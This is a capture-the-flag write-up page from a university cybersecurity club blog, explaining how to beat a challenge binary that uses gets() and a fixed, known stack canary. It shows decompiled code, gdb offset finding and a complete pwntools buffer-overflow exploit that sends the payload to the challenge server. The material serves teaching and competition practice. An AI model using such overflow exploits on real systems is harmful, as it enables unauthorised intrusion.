@@ -1,0 +1,45 @@
+<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Overflow Orchestra</title><meta content="Overflow Orchestra" name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/Guild_Selection_CTF/overfloworchestra/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content="Overflow Orchestra" property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/Guild_Selection_CTF/overfloworchestra/ property=twitter:url><meta content="Overflow Orchestra" property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/Guild_Selection_CTF/overfloworchestra/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>overfloworchestra</span></div><time datetime=2024-09-05>Published on: <span class=accent-data>2024-09-05</span></time><address rel=author>By <span class=accent-data> Achintya J, and exploiitm </span></address><h1>Overflow Orchestra</h1><p>This is how the canary is implemented here (This is the decompiled function through IDA)<pre style=background:#282828;color:#fdf4c1aa><code><span>	v6 = 0LL;
+</span><span>	v5 = 0x6C9B1F74;
+</span><span>	puts("Oops! I hope that wasn't your plan all along.");
+</span><span>	fflush(_bss_start);
+</span><span>	gets(v3, argv);
+</span><span>	v4 = v5 ^ 0x6C9B1F74;
+</span><span>	if ( v5 != 0x6C9B1F74 )
+</span><span>	{
+</span><span>	puts("Surprise! Something went wrong, didn't it?");
+</span><span>	puts("Who let the bugs out?");
+</span><span>	exit(1);
+</span><span>	}
+</span></code></pre><p>This means, we effectively have the canary leaked…<p>and,<pre style=background:#282828;color:#fdf4c1aa><code><span>	if ( v6 == 0xDEADBEEF )
+</span><span>	{
+</span><span>	puts("Well, I guess you've earned this...");
+</span><span>	system("cat flag.txt");
+</span><span>	}
+</span><span>	else
+</span><span>	{
+</span><span>	printf("code == 0x%llx\n", v6);
+</span><span>	printf("code != 0x%llx :(\n", 3735928559LL);
+</span><span>	puts("Well, that was unexpected...");
+</span><span>	}
+</span><span>	exit(0);
+</span><span>	}
+</span></code></pre><p>This means, we still got to rewrite the <code>v6</code> variable.<p>Let’s analyse using <code>gdb</code>. Run the following commands in succession,<pre style=background:#282828;color:#fdf4c1aa><code><span>	gdb ./vuln
+</span><span>	disassemble main
+</span></code></pre><p>We can see in the disassembly that at the address <code>main+79</code> or <code>0x0000000000001238</code> there is an <code>xor</code> instruction. This is what we need to see, because we want to figure out the number of bytes we should write to change the value being xored.<p>After running, we can enter this string “Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A” and see that the RAX registry contains, “Ab6Ab7Ab”, which is at an offset of 48.<p>Hence, after 48 bytes, whatever is written is being xored with <code>0x6c9b1f74</code>. If we need the answer to be 0, we need to send in the same data here. We can also see this in the stack dump in ghidra,<pre style=background:#282828;color:#fdf4c1aa><code><span>	undefined main()
+</span><span>	undefined         AL:1           &LTRETURN>
+</span><span>	undefined8        Stack[-0x10]:8 ToRewrite                               XREF[3]:     001011f5(W), 
+</span><span>	undefined8        Stack[-0x18]:8 TheCanary                               XREF[2]:     001011fd(W), 
+</span><span>	undefined8        Stack[-0x20]:8 xored                                   XREF[2]:     0010123e(W), 
+</span><span>	undefined1[40]    Stack[-0x48]   input                                   XREF[1]:     00101223(*)  
+</span></code></pre><p>We can see that right after the canary is the variable we want to rewrite into <code>0xdeadbeef</code>. Thus, this script will be do everything,<pre style=background:#282828;color:#fdf4c1aa><code><span>	from pwn import *
+</span><span>	context.binary = binary = ELF("./vuln")
+</span><span>	context.log_level = "critical"
+</span><span>	payload = flat([
+</span><span>		b"A"*48,
+</span><span>		p64(0x6c9b1f74),
+</span><span>		p32(0xdeadbeef)
+</span><span>		])
+</span><span>	p = remote('10.21.232.38', 7002)
+</span><span>	p.sendline(payload)
+</span><span>	p.interactive()
+</span></code></pre><p>flag: <code>iitmCTF{0v3rfl0w_0p3r4_t1c}</code><p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>
